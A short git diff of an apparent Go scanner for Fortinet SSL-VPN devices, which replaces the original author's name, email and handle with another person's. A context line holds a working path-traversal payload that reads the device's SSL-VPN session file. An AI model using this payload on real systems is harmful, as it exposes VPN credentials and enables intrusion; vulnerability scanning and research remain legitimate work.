@@ -16,7 +16,7 @@ import (
 	"github.com/common-nighthawk/go-figure"
 )
 
-const userAgent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 - github.com/anasbousselham/)"
+const userAgent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 - github.com/kal1gh0st/)"
 const signature = "var fgt_lang ="
 const payloads = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
 const (
@@ -27,9 +27,9 @@ const (
 	DebugColor   = "\033[0;36m%s\033[0m"
 )
 
-var codername = "Anas Bousselham"
+var codername = "Francesco Fedele"
 var ver = "0.6"
-var email = "anasoft@gmail.com"
+var email = "fedele.kali17@gmail.com"
 
 func logoprint() {
 	logo := figure.NewFigure("fortiScan", "", true)
